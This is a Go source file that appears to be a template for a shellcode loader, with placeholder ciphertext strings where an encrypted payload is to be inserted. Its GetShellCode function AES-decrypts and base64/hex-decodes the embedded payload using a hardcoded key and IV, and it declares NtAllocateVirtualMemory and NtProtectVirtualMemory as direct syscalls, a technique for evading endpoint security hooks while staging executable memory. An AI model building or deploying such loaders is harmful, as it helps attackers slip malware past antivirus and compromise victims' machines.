package cmds

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"unsafe"
)

func main() {

}

func PKCS5UnPadding(src []byte) []byte {
	length := len(src)
	unpadding := int(src[length-1])
	return src[:(length - unpadding)]
}

func GetShellCode() []byte {
	var ciphertext string
	ciphertext = ciphertext + "AESString1"
	ciphertext = ciphertext + "AESString2"

	vciphertext, _ := base64.StdEncoding.DecodeString(ciphertext)

	vkey, _ := base64.StdEncoding.DecodeString("3vrGlbK0GCZqMyaq21rLoEh42u3fWwONZkBpHnBxNQ8=")
	viv, _ := base64.StdEncoding.DecodeString("twGerf2yUJtFTjo6PX15vg==")

	block, _ := aes.NewCipher(vkey)

	decrypted := make([]byte, len(vciphertext))
	mode := cipher.NewCBCDecrypter(block, viv)
	mode.CryptBlocks(decrypted, vciphertext)
	stuff := PKCS5UnPadding(decrypted)

	rawdata := (string(stuff))
	hexdata, _ := base64.StdEncoding.DecodeString(rawdata)
	raw_bin, _ := hex.DecodeString(string(hexdata))
	return raw_bin
}

func NtProtectVirtualMemory_Func(sysid uint16, processHandle uintptr, baseAddress, regionSize *uintptr, NewProtect uintptr, oldprotect *uintptr) (uint32, error) {

	return NtProtectVirtualMemory(
		sysid,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		NewProtect,
		uintptr(unsafe.Pointer(oldprotect)),
	)
}

func NtAllocateVirtualMemory(callid uint16, PHandle uint64, BaseA, ZeroBits, RegionSize, AllocType, Protect uintptr, nothing uint64) uintptr
func NtProtectVirtualMemory(callid uint16, argh ...uintptr) (errcode uint32, err error)
